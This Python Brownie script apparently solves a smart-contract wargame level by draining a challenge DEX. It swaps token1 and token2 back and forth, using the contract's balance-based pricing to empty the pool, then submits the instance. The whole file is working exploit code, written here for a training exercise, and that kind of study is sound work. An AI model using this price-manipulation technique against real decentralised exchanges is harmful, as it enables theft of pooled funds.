from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
)
from web3 import Web3


def main():
    player = get_account()
    instance_address = get_new_instance(level_id=22, player=player)

    dex_contract = interface.IDex(instance_address)
    token1 = dex_contract.token1()
    token2 = dex_contract.token2()
    dex_contract.approve(dex_contract, 110, {"from": player})

    from_token = token1
    to_token = token2
    while (dex_contract.balanceOf(token1, dex_contract) and dex_contract.balanceOf(token2, dex_contract)):
        # warning: there's probably risk of infinite loop with different starting balances
        print_state(dex_contract, player)
        from_token, to_token = to_token, from_token
        num_tokens_to_swap = min(
            dex_contract.balanceOf(from_token, player),
            get_num_tokens_to_drain_dex(dex_contract, from_token, to_token)
        )
        tx = dex_contract.swap(from_token, to_token, num_tokens_to_swap, {"from": player})
        tx.wait(1)

    submit_instance(instance_address, player)

def get_num_tokens_to_drain_dex(dex_contract, from_token, to_token):
    num_tokens_to_swap = 0
    while (dex_contract.get_swap_price(from_token, to_token, num_tokens_to_swap) < dex_contract.balanceOf(to_token, dex_contract)):
        num_tokens_to_swap += 1
    return num_tokens_to_swap

def print_state(dex_contract, player):
    token1 = dex_contract.token1()
    token2 = dex_contract.token2()

    print('Player balances:')
    print(f'token1: {dex_contract.balanceOf(token1, player)}')
    print(f'token2: {dex_contract.balanceOf(token2, player)}')
    print()
    print('Dex balances:')
    print(f'token1: {dex_contract.balanceOf(token1, dex_contract)}')
    print(f'token2: {dex_contract.balanceOf(token2, dex_contract)}')
    print()
    print(f'Possible swaps:')
    num_tokens_to_swap = dex_contract.balanceOf(token1, player)
    print(f'{num_tokens_to_swap} token1 -> {dex_contract.get_swap_price(token1, token2, num_tokens_to_swap)} token2')
    num_tokens_to_swap = dex_contract.balanceOf(token2, player)
    print(f'{num_tokens_to_swap} token2 -> {dex_contract.get_swap_price(token2, token1, num_tokens_to_swap)} token1')
    print()
